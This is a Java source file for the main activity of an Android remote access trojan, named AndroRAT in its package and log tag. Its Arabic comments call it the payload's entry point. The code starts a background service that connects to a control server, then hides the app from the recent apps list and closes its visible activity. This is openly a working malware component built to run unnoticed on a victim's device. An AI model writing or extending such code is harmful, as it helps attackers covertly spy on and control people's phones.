package com.example.androratclient;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

/**
 * النشاط الرئيسي للبايلود
 * يقوم بتشغيل الخدمة في الخلفية ثم يخفي نفسه
 */
public class MainActivity extends Activity {
    private static final String TAG = "AndroRAT_MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d(TAG, "MainActivity started");
        
        // بدء تشغيل خدمة الاتصال بالسيرفر
        Intent serviceIntent = new Intent(this, ClientService.class);
        startService(serviceIntent);
        
        // إخفاء التطبيق من قائمة التطبيقات الحديثة
        moveTaskToBack(true);
        
        // إنهاء النشاط لتوفير الذاكرة
        finish();
    }
}

